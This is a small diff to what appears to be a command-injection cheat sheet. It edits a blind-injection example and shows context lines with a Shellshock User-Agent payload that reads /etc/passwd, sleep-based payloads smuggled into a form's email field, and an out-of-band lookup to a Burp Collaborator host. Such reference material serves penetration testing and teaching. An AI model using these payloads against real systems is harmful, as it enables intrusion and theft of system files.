@@ -20,7 +20,7 @@ nslookup+burpcollaborator.net
 User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" >> In User-Agent Header.
 ```
 ## Blind injection
-Example: name=test&email=```;sleep 5;```&subject=test&message=test or, name=test&email=```||sleep 5||```&subject=test&message=test
+Example:  name=test&email=```;sleep 5;```&message=test or, name=test&email=```||sleep 5||```&message=test
 ```sh
 & sleep 10 #
 
